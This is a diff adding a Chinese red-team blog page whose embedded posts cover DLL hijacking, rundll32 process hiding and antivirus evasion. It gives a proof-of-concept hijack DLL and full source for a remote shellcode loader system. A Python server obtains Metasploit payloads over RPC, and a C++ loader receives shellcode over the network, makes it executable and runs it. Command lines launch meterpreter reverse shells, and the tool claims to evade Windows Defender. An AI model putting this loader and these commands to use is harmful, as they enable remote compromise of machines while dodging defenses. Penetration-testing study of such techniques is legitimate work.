+  <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
+        <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
+        <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
+  <span class="k">break</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">owned</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">MessageBox</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"iExplorer DLL Hijacked\Hadji Samir"</span><span class="p">,</span> <span class="s">"POC"</span><span class="p">,</span> <span class="n">MB_OK</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cp">#include &lt;windows.h&gt;
+#define DLLIMPORT __declspec (dllexport)
+</span> 
+<span class="n">DLLIMPORT</span> <span class="kt">void</span> <span class="nf">HrCreateConverter</span><span class="p">()</span> <span class="p">{</span> <span class="n">evil</span><span class="p">();</span> <span class="p">}</span>
+ 
+<span class="kt">int</span> <span class="nf">evil</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">WinExec</span><span class="p">(</span><span class="s">"calc"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<h2 id="0x03-__declspec">0x03 __declspec</h2>
+
+<p><code class="language-plaintext highlighter-rouge">__declspec</code>是Microsoft VC中专用的关键字，它配合着一些属性可以对标准C/C++进行扩充。<code class="language-plaintext highlighter-rouge">__declspec</code>关键字应该出现在声明的前面。</p>
+
+<p><code class="language-plaintext highlighter-rouge">__declspec(dllexport)</code>用于Windows中的动态库中，声明导出函数、类、对象等供外面调用，省略给出.def文件。即将函数、类等声明为导出函数，供其它程序调用，作为动态库的对外接口函数、类等。</p>
+
+<p><code class="language-plaintext highlighter-rouge">__declspec(dllimport)</code>用于Windows中，从别的动态库中声明导入函数、类、对象等供本动态库或exe文件使用。当你需要使用DLL中的函数时，往往不需要显示地导入函数，编译器可自动完成。</p>
+
+<h2 id="0x04-关于rundll32">0x04 关于rundll32</h2>
+
+<p>Rundll32.exe是什么？顾名思意，”执行32位的DLL文件”。它的作用是执行DLL文件中的内部函数，这样在进程当中，只会有Rundll32.exe，而不会有DLL后门的进程，这样，就实现了进程上的隐藏。</p>
+
+<p>– 百度百科</p>
+
+<p>经过如上解释，可以总结为，rundll32能够运行一个32位的dll文件，并且在进程列表中只能看到rundll32.exe，但是遍历rundll32.exe的模块列表可以看到进程加载的dll。</p>
+
+<hr />
+
+<p><strong>并不是所有的dll都能够被rundll32运行。</strong> 为何这么说，因为rundll32只支持特定的函数声明方式，并且该函数必须在dll文件的导出表中。关于导出表的知识可以阅读 - 《Windows PE权威指南》 👍</p>
+
+<p>rundll32.exe支持的函数原型如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VOID CALLBACK FunctionName (HWND hwnd,HINSTANCE hinst,LPTSTR lpCmdLine,INT nCmdShow);
+</code></pre></div></div>
+
+<p>通过原型可以发现，与Windows平台下的<code class="language-plaintext highlighter-rouge">WinMain</code>一模一样，可以理解为rundll32调用的函数就是一段代码的入口函数。</p>
+
+<p>下面来写一个支持rundll32运行的dll：</p>
+
+<ol>
+  <li>使用visual studio新建一个dll工程，并声明函数：<code class="language-plaintext highlighter-rouge">rundll</code></li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;Windows.h&gt;
+
+
+extern "C" __declspec(dllexport) void rundll(HWND hwnd,HINSTANCE hinst,LPTSTR lpCmdLine,INT nCmdShow){
+
+	MessageBox(NULL,TEXT("-Test-"),TEXT("Rundll32"),MB_OK);
+
+}
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/00fc4fb53fc6fe2066e0273a84b03e28.png" alt="2019-10-02-19-58-36" /></p>
+
+<ol>
+  <li>使用rundll32运行dll</li>
+</ol>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1dfbb642309ac2a2a741c529751ce50c.png" alt="2019-10-02-20-00-18" /></p>
+
+<p>通过进程列表查看：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7c1e7c60d47a3d76d7f47a40c1354d68.png" alt="2019-10-02-20-00-54" /></p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f7afbb1ba62e1a1280cb3d1df141ad21.png" alt="2019-10-02-20-04-38" /></p>
+
+<p>使用<code class="language-plaintext highlighter-rouge">wmic process get commandline</code>也可以获得命令行详情：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b29994c93ed7dd8514360df92fbca405.png" alt="2019-10-02-20-02-49" /></p>
+
+<p>还有一种方式是获得该进程加载的模块，这是最精确的了；但windows 7不能直接看到，需要借助工具。（win10可以通过任务查看器看到..）</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/55c8bd2002161bf855fffea28e31c05d.png" alt="2019-10-02-20-08-24" /></p>
+
+<p><strong>这个dll是没有DllMain也能够正常运行的，并不是所有的dll都有DllMain这个函数</strong></p>
+
+<p>我经过实验后发现，一个dll有没有DllMain完全取决于当前这个dll对于功能的需求，如果对装载方式的状态没有特定的要求，完全可以省去编写DllMain，因为DllMain不是一个导出函数，永远是一个由系统被动调用的函数。</p>
+-->
+          深入了解一下DllMain
+          <p>
+            <a class="post-link" href="/archivers/2019-10-02/1">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2019-09-24/1">后渗透下遇到的问题一（静态免杀）</a>
+        </h2>
+        
+        <div class="post-meta">Sep 24, 2019</div>
+
+        <div class="post-excerpt">
+          <!--<h1 id="后渗透下遇到的问题一静态免杀">后渗透下遇到的问题一（静态免杀）</h1>
+
+<p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p>
+
+<p>文章作者拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经文章作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。</p>
+
+<h2 id="前言">前言</h2>
+
+<p>通常在演练过程里，目的是追求快速的获取更多的权限，但是目标机器都安装了各种反病毒软件，种类繁多，大多对于静态查杀管控较为严格，导致一些工具无法使用。而在这个夹缝中生存的渗透师，就必须要学习更多的知识，本文会阐述一些关于静态免杀的方案，以及我的理解，如有不对，请斧正。</p>
+
+<h2 id="关于代码">关于代码</h2>
+
+<p>一般来说，不管是Linux操作系统、Windows操作系统，可执行的应用程序文件，都遵循着一种格式：</p>
+
+<ul>
+  <li>Linux ELF</li>
+  <li>Windows PE</li>
+</ul>
+
+<p>这种格式又包含了：可执行的应用程序、动态链接库等等，如Windows下的<em>.exe、</em>.dll。</p>
+
+<p>而这些文件，其中都有一块空间用于保存程序的代码，也就是指令集，操作系统若想要执行一个文件，就要先将文件加载到内存，并分配相应的虚拟地址空间，创建一个进程和线程，线程再去执行程序的代码。</p>
+
+<p>那么假设如上可以理解，就能够推断出常用的Shellcode加载器的工作原理：</p>
+
+<ul>
+  <li>Shellcode是代码本身</li>
+  <li>加载器是具备读取代码的程序</li>
+  <li>加载器执行后，操作系统会创建一个进程与一个线程</li>
+  <li>第一个线程用于读取代码（Shellcode）并创建第二个线程，将线程执行的第一条指令指向代码（Shellcode）</li>
+</ul>
+
+<h2 id="关于内存">关于内存</h2>
+
+<p>在Windows操作系统中，每个进程互不干扰（除了公用的内核对象以外），都有自己的虚拟内存空间，而这一块线性的内存空间又被切成一页一页的大小，通常默认情况下，每页的大小是4KB。</p>
+
+<p>Windows通过以页的单位来管理进程的虚拟内存空间，最典型的例子：</p>
+
+<p>https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LPVOID VirtualAlloc(
+  LPVOID lpAddress,
+  SIZE_T dwSize,
+  DWORD  flAllocationType,
+  DWORD  flProtect
+);
+</code></pre></div></div>
+
+<p>使用<code class="language-plaintext highlighter-rouge">VirtualAlloc</code> Windows API 可向操作系统申请内存空间，操作系统根据指定的大小来调整分配几页，并且会自动进行内存对齐。</p>
+
+<p>为什么要讲到内存呢，因为静态免杀的核心就是将代码加载至内存，理解内存的管理方式，才能产生更多的想法。</p>
+
+<h2 id="关于静态免杀">关于静态免杀</h2>
+
+<p>静态免杀，提起这个很多人会想到很久远的…. 花指令、压缩壳、垃圾资源 等等。</p>
+
+<p>但是由于Shellcode加载器的出现，很多人开始从源码方面出发，通过正常且无害的API来构建一个加载器。</p>
+
+<p>这里说一个问题，比如：</p>
+
+<ul>
+  <li>lcx.exe 这款工具，很多人说它是黑客工具，但真的如此吗？</li>
+  <li>中国菜刀这款工具，很多人说它是黑客工具，但真的如此吗？</li>
+  <li>灰鸽子远控，很多人说它是黑客工具，但真的如此吗？</li>
+</ul>
+
+<p>其实在软件的世界里，善与恶也取决于你的心……</p>
+
+<ul>
+  <li>lcx 本身解决了端口转发的问题，方便了网管；</li>
+  <li>中国菜刀，出发点是为网站管理员管理网站方便的，因为以前大多使用虚拟主机，用ftp更新代码，比较繁琐。</li>
+  <li>灰鸽子远控，出发点是为了方便给企业管理终端</li>
+</ul>
+
+<p>所以说，程序的好坏，取决于用途和目的。</p>
+
+<p>说完正反的问题，再聊聊加载器，目前见的最多的是两大加载器：</p>
+
+<ul>
+  <li>Shellcode加载器</li>
+  <li>PE加载器</li>
+</ul>
+
+<p>两者有什么不同呢，我想可能就是加载的文件格式不同，但最终都要运行文件中的代码。</p>
+
+<h2 id="metasploit">Metasploit</h2>
+
+<p>我用Metasploit有些时间了，起初觉得非常强大，关于Metasploit早期的文章里说到让目标上线的过程里，一定会包含生成木马的环节，最早是叫msfpayload后来改成了msfvenom，经过不断的优化，msfvenom目前速度变快了许多，但是生成木马一直是一个繁琐的事情。</p>
+
+<p>为了解决这个问题，我做了一件事，写了一个远程的Shellcode加载器，Shellcode不需要混淆，也能正常工作，并且支持所有payload，例如：</p>
+
+<ul>
+  <li>windows/x64/meterpreter/bind_tcp</li>
+  <li>windows/meterpreter/reverse_tcp</li>
+  <li>windows/meterpreter/reverse_tcp_rc4</li>
+  <li>….</li>
+</ul>
+
+<p>我给这个项目取名叫：StageOnliner，查了一下，英语里没有Onliner，但就是要硬核一下，名字只是一个叫法。</p>
+
+<h2 id="stageonliner">StageOnliner</h2>
+
+<p>StageOnliner 主要是为了解决Windows平台下上线metasploit各种模块生成的繁琐问题</p>
+
+<p>例如上线 windows/meterpreter 和 windows/x64/meterpreter 下的模块，需要生成 shellcode 或 使用msfvenom生成PE文件执行，而使用StageOnliner可以将所有模块兼容，只需要上传一个StageOnliner.exe即可。</p>
+
+<p>特性：</p>
+
+<ul>
+  <li>兼容Metasploit所有Payload模块</li>
+  <li>支持网络正向、反向、加密</li>
+  <li>支持分离部署</li>
+  <li>支持客户端操作系统、服务器操作系统 90%</li>
+  <li>支持64位、32位操作系统</li>
+  <li>体积小</li>
+</ul>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6c2ea55143f9c780783297f338957aa2.png" alt="2019-09-24-21-14-47" /></p>
+
+<h3 id="文件属性">文件属性</h3>
+
+<p>该文件属性如下：</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>属性</th>
+      <th>值</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>体积</td>
+      <td>90KB</td>
+    </tr>
+    <tr>
+      <td>免杀情况</td>
+      <td>最新Windows Defender</td>
+    </tr>
+    <tr>
+      <td>兼容平台</td>
+      <td>Windows XP +</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="参数示例">参数示例</h3>
+
+<p>上线reverse_tcp_rc4示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\windows\system32\cmd.exe /c C:\www\StageOnliner-x86.exe -p windows/meterpreter/reverse_tcp_rc4 -s LHOST=192.168.117.1,LPORT=1122,RC4PASSWORD=hello -H 192.168.117.1 -P 4474
+</code></pre></div></div>
+
+<p>上线reverse_tcp示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\windows\system32\cmd.exe /c C:\www\StageOnliner-x86.exe -p windows/meterpreter/reverse_tcp -s LHOST=192.168.117.1,LPORT=1122 -H 192.168.117.1 -P 4474
+</code></pre></div></div>
+
+<p>上线bin_tcp x64示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\windows\system32\cmd.exe /c C:\www\StageOnliner-x86.exe -p windows/x64/meterpreter/bind_tcp -s RHOST=192.168.117.169,LPORT=1122 -H 192.168.117.1 -P 4474
+</code></pre></div></div>
+
+<h3 id="使用帮助">使用帮助</h3>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6c2ea55143f9c780783297f338957aa2.png" alt="2019-09-24-21-15-27" /></p>
+
+<p>使用方式：</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Server</th>
+      <th>IP地址</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Metasploit Server</td>
+      <td>192.168.117.1</td>
+    </tr>
+    <tr>
+      <td>Stager Server</td>
+      <td>192.168.117.1</td>
+    </tr>
+    <tr>
+      <td>Target Server</td>
+      <td>192.168.117.169</td>
+    </tr>
+    <tr>
+      <td>Metasploit Server</td>
+      <td>1.1.1.1</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>PS：服务器可分离部署，StageOnliner可上线多台服务器</p>
+
+<p><strong>在Metasploit Server上启动msfrpcd：</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rvn0xsy@MacBook-Pro ~&gt; /opt/metasploit-framework/bin/msfrpcd -U msf -P msf -u /api/1.0/
+[*] MSGRPC starting on 0.0.0.0:55553 (SSL):Msg...
+[*] URI: /api/1.0/
+[*] MSGRPC backgrounding at 2019-09-14 18:41:14 +0800...
+[*] MSGRPC background PID 50486
+</code></pre></div></div>
+
+<p><strong>在Stager Server上启动server.py：</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 server.py -U msf -P msf -H 127.0.0.1 -p 55553 -s -v -l 4474 -S 192.168.117.1
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/bf5d68a74868a1320c46bae5854c080e.png" alt="2019-09-24-21-15-54" /></p>
+
+<p><strong>在目标机器上启动StageOnliner：</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\windows\system32\cmd.exe /c C:\www\StageOnliner-x86.exe -p windows/meterpreter/reverse_tcp -s LHOST=192.168.117.1,LPORT=1122 -H 192.168.117.1 -P 4474
+</code></pre></div></div>
+
+<p>这个项目前身叫：Cooolis-ms，后来我不小心把源代码删除了，就重写了一下。</p>
+
+<p>整个StageOnliner的工作模块分为三个：</p>
+
+<ul>
+  <li>StageOnliner - Loader</li>
+  <li>StageOnliner - Server</li>
+  <li>StageOnliner - Metasploit RPC Server</li>
+  <li>StageOnliner - Metasploit Console</li>
+</ul>
+
+<p>客户端就叫Loader，运行后会向Server取回对应的模块Shellcode，其中Server接收请求后，会登录Metasploit RPC Server，调用API Method，RPC Server会把生成好的Shellcode回传，最终到达Loader，执行，上线到Console。</p>
+
+<ul>
+  <li>Loader -&gt; Server</li>
+  <li>Server -&gt; RPC Server</li>
+  <li>RPC Server -&gt; Server</li>
+  <li>Server -&gt; Loader</li>
+  <li>Loader -&gt; Console</li>
+</ul>
+
+<p>其中，Server、RPC Server、Console都可以分离部署。</p>
+
+<h2 id="stageonliner---实现">StageOnliner - 实现</h2>
+
+<p>参考：https://metasploit.help.rapid7.com/docs/standard-api-methods-referenc</p>
+
+<p>上面是Metasploit关于RPC服务的接口手册</p>
+
+<p>Server代码：https://github.com/Rvn0xsy/Cooolis-ms/</p>
+
+<p>目前可能无法正常工作了，本文不分享这类工具，只是交流想法。</p>
+
+<p>我写出的Server代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"""
+Cooolis-ms
+------------
+Author:Rvn0xsy@gmail.com
+根据Metasploit Framework RPC 实现远程生成PAYLOAD，主要用于给灵活的PE加载器、Shellcode工作
+Github:https://github.com/Rvn0xsy/Cooolis-ms/
+"""
+import requests
+from argparse import ArgumentParser
+import msgpack
+import ssl
+import sys
+import json
+import term
+import struct
+from socketserver import BaseRequestHandler,ThreadingTCPServer
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+ssl._create_default_https_context = ssl._create_unverified_context
+
+
+class Metasploit_RPC(BaseRequestHandler):
+    def __init__(self, request, client_address, server, args):
+        self.type = args.type
+        self.username = args.username
+        self.password = args.password
+        self.listen = args.listen
+        self.host = args.host
+        self.port = args.port
+        self.server = args.server
+        self.uri = args.uri
+        self.debug = args.versobe
+        self.token = ''
+        self.url = ''
+        self.headers = {"Content-type" : "binary/message-pack"}
+        if args.ssl:
+            prefix = 'https://'
+        else:
+            prefix = 'http://'
+        self.url = "{prefix}{host}:{port}{uri}".format(prefix=prefix,host=self.host,port=self.port,uri=self.uri)
+        super().__init__(request, client_address, server)
+
+    @classmethod
+    def Creator(cls, *args, **kwargs):
+        def _HandlerCreator(request, client_address, server):
+            cls(request, client_address, server, *args, **kwargs)
+        return _HandlerCreator
+
+
+    def _request(self,options):
+        try:
+            term.writeLine("[*]API URL : {url} , Method : {method}".format(url=self.url,method=options[0]), term.green)
+            options = self.__pack(options)
+            req  = requests.post(self.url,verify=False,headers=self.headers,data=options)
+            result = self.__unpack(req.content)
+            if b'error' in result:
+                print("Error : %s" % str(result[b'error_message']),encoding = "utf8")
+            else:
+                return result
+        except Exception as e:
+            sys.stderr.write(str(e)+"\nRef:https://metasploit.help.rapid7.com/docs/standard-api-methods-referenc\n")
+    
+
+    def _get_token(self):
+        options = ["auth.login",self.username,self.password]
+        
+        result = self._request(options)
+        self.token = str(result[b'token'],encoding = "utf8")
+        term.writeLine("[*]Token: {token} Username : {username} Password : {password}".format(token=self.token,username=self.username,password=self.password),term.green)
+    
+    # 打包数据
+    def __pack(self,pack_str):
+        return msgpack.packb(pack_str)
+    
+    # 解包数据
+    def __unpack(self,pack_str):
+        return msgpack.unpackb(pack_str)
+
+    def __send_payload(self,payload,options):
+        term.writeLine("[*]PAYLOAD: {payload}".format(payload=payload),term.green)
+        pack_data = ["module.execute",self.token,"payload",payload,options]
+        return self._request(pack_data)
+
+    def handle(self):
+        term.writeLine("[*]New connection: {client}".format(client=self.client_address),term.green)
+        self._get_token()
+        while True:
+            data = self.request.recv(1024)
+            if not data:break
+            try:
+                data = struct.unpack("&gt;200s200s200sLHH",data)
+                options = {}
+                str_json = data[1].decode('UTF-8')
+                str_json = str_json.strip('\x00')
+                # print("Options : %s size : %d",str_json,len(str_json))
+                for x in str_json.split(','):
+                    k,v = x.split('=',2)
+                    # print(k,":",v)
+                    options.update({k.strip():v.strip()})
+                payload = data[0].decode('UTF-8')
+                payload = payload.strip('\x00')
+                # print("Payload : %s Options : %s " % (payload,options['LHOST']))
+                recv_payload = self.__send_payload(payload,options)
+                # print("Send ..  %s ",recv_payload)
+                payload_size = len(recv_payload[b'payload'])
+                self.request.send(payload_size.to_bytes(4,byteorder='little',signed=False))
+                self.request.send(recv_payload[b'payload'])
+                self.request.close()
+            except Exception as e:
+                term.writeLine("[!]{error}".format(error=str(e)),term.red)
+                pass
+            finally:
+                break
+
+def main():
+    example = 'Example:\n\n$ python3 server.py -U msf -P msf -v -s -l 4444'
+    args = ArgumentParser(prog='Cooolis-ms',epilog=example)
+    args.add_argument('-U','--username',help='Metasploit web service username',required=True)
+    args.add_argument('-P','--password',help='Metasploit web service password',required=True)
+    args.add_argument('-H','--host',help='Metasploit web service host, Default: localhost',default='localhost')
+    args.add_argument('-p','--port',help='Metasploit RPC service port, Default: 55553',default=55553,type=int)
+    args.add_argument('-S','--server',help='Payload sender listen host, Default: localhost',default='localhost')
+    args.add_argument('-l','--listen',help='Payload listen port, Default: 1111',default=1111,type=int)
+    args.add_argument('-u','--uri',help='Metasploit RPC service uri, Default: /api/1.0/',default='/api/1.0/')
+    args.add_argument('-t','--type',help='Payload Type',choices=('exe','ruby','c','dll','vbs','powershell'))
+    args.add_argument('-s','--ssl',help='Enable ssl, Default: True',action="store_true",default=True)
+    args.add_argument('-v','--versobe',help='Enable debug',action="store_true")
+    parser = args.parse_args()
+    term.writeLine("[*]Server Host : {host} , Server Port : {port}".format(host=parser.server,port=parser.listen), term.green)
+    server = ThreadingTCPServer((parser.server,parser.listen),Metasploit_RPC.Creator(parser))
+    server.serve_forever()
+    
+if __name__ == "__main__":
+    main()
+</code></pre></div></div>
+
+<p>启动Server之前，需要启动msfrpcd：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rvn0xsy ~&gt; /opt/metasploit-framework/bin/msfrpcd -U msf -P msf -u /api/1.0/
+[*] MSGRPC starting on 0.0.0.0:55553 (SSL):Msg...
+[*] URI: /api/1.0/
+[*] MSGRPC backgrounding at 2019-09-14 18:41:14 +0800...
+[*] MSGRPC background PID 50486
+</code></pre></div></div>
+
+<p>启动Server：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 server.py -U msf -P msf -H 127.0.0.1 -p 55553 -s -v -l 4474 -S 192.168.117.1
+</code></pre></div></div>
+
+<p>在目标机器上运行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\windows\system32\cmd.exe /c C:\www\StageOnliner-x86.exe -p windows/meterpreter/reverse_tcp -s LHOST=1
+92.168.117.1,LPORT=1122 -H 192.168.117.1 -P 4474
+</code></pre></div></div>
+
+<p>然后在metasploit中开启一个handler，监听windows/meterpreter/reverse_tcp即可上线。</p>
+
+<h2 id="stageonliner---loader">StageOnliner - Loader</h2>
+
+<p>这块要单独挑出来说，因为它需要落地，涉及到一些API的使用：</p>
+
+<ul>
+  <li>网络连接</li>
+  <li>内存管理</li>
+  <li>线程管理</li>
+</ul>
+
+<p>流程大致如下：</p>
+
+<h3 id="第一步">第一步</h3>
+
+<p>运行起来后，程序先申请一块内存空间：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CONST INT PAYLOAD_LEN = 200;
+
+struct stager {
+	char payload[PAYLOAD_LEN];
+	char options[PAYLOAD_LEN];
+};
+</code></pre></div></div>
+
+<p>假设为 200x2 = 400字节大小。</p>
+
+<p>第一块放要使用的payload，第二块放payload的设置选项，以逗号分隔。</p>
+
+<p>通过server中转相当于把msfvenom实现在本地了。</p>
+
+<h3 id="第二步">第二步</h3>
+
+<p>读取用户输入：GetCommandline()</p>
+
+<p>然后将输入的参数放入stager结构体。</p>
+
+<h3 id="第三步">第三步</h3>
+
+<p>连接Server，将结构体发送到Server，Server通过struct解析payload与options，调用msfrpc，生成shellcode，返回给Loader。</p>
+
+<p>代码片段：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// 连接套接字
+	while (connect(socks, (struct sockaddr*) &amp; sock_addr, sizeof(sock_addr)) == SOCKET_ERROR) {
+		cout &lt;&lt; "[!]Connect error ! " &lt;&lt; GetLastError() &lt;&lt; endl;
+		Sleep(5000);
+		continue;
+	}
+
+	send(socks, (char*)&amp; sd, sizeof(sd), 0);
+	recv(socks, (char*)&amp; dwPayloadLength, sizeof(DWORD), 0);
+	Sleep(3000);
+	CHAR* pSpace = (CHAR*)VirtualAlloc(NULL, dwPayloadLength, MEM_COMMIT, PAGE_READWRITE);
+	recv(socks, pSpace, dwPayloadLength,0);
+	closesocket(socks);
+	VirtualProtect(pSpace, dwPayloadLength, PAGE_EXECUTE_READ, &amp;dwOldProtect);
+	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pSpace, NULL, NULL, NULL);
+	WaitForSingleObject(hThread, INFINITE);
+	VirtualFree(hThread, 0, MEM_RELEASE);
+</code></pre></div></div>
+
+<p>至此，演练环境下不需要考虑静态免杀的问题了，只需要提前搭建好Server、Metasploit RPC Server，剩下的就靠Console Server和Loader配合，Shellcode全在网络中传输……</p>
+
+<p>目前我没实现流量加密，也就是说第一个数据包是明文的，后续会采用RC4等优化。</p>
+
+<p>由于工具有些敏感，暂时就先抛出思路来~</p>
+
+-->
+          通常在演练过程里，目的是追求快速的获取更多的权限，但是目标机器都安装了各种反病毒软件，种类繁多，大多对于静态查杀管控较为严格，导致一些工具无法使用。而在这个夹缝中生存的渗透师，就必须要学习更多的知识，本文会阐述一些关于静态免杀的方案，以及我的理解，如有不对，请斧正。
+          <p>
+            <a class="post-link" href="/archivers/2019-09-24/1">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+  </ul>
+  
+  <!-- Pagination links -->
+<div class="pagination">
+  
+    <a href="/page6" class="previous">PREV</a>
+  
+  <span class="page_number ">7 of 34</span>
+  
+    <a href="/page8" class="next">NEXT</a>
+  
+</div>
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
